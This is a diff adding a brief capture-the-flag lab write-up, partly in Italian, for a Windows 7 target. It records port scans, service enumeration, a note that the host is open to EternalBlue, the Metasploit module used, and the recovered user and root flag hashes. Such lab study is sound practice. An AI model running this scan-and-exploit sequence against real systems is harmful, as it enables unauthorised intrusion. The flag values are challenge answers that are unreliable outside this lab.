@@ -1,0 +1,75 @@
+10.10.10.40
+
+sudo masscan -p1-65535 10.10.10.40 --rate 1000 --open --banners -e tun0                                                                                                                                1 ⨯
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-09 13:10:34 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 49155/tcp on 10.10.10.40                                  
+Discovered open port 49152/tcp on 10.10.10.40                                  
+Discovered open port 135/tcp on 10.10.10.40                                    
+Discovered open port 139/tcp on 10.10.10.40                                    
+Discovered open port 49154/tcp on 10.10.10.40                                  
+Discovered open port 445/tcp on 10.10.10.40                                    
+Discovered open port 49156/tcp on 10.10.10.40                                  
+Discovered open port 49157/tcp on 10.10.10.40                                  
+Discovered open port 49153/tcp on 10.10.10.40
+
+nmap -sC -sV -p 135,139,445,49152-49157 10.10.10.40
+
+Nmap scan report for 10.10.10.40
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2m19s, deviation: 2s, median: 2m17s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-11-09T13:16:42+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-11-09T13:16:41
+|_  start_date: 2021-11-09T13:10:02
+
+
+Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+
+Windows 7 Professional SP1 (Service Pack 1) dovrebbe essere vulnerabile ad eternal blue:
+
+si può usare metasploit per accedere direttamente come root o modificare il PoC (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
+
+uso metasploit
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+C:\Users\haris\Desktop>type user.txt
+type user.txt
+4c546aea7dbee75cbd71de245c8deea9
+
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
+
+
